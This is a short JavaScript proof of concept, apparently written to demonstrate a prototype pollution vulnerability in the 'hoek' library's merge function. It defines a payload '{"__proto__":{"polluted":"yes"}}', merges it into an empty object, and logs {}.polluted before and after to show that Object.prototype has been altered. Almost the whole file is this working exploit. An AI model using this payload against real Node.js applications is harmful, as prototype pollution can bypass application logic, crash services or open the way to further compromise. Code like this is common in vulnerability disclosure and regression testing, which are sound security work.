var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const Hoek = require('hoek');
obj = {};
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
Hoek.merge(obj, JSON.parse(malicious_payload));
console.log({}.polluted);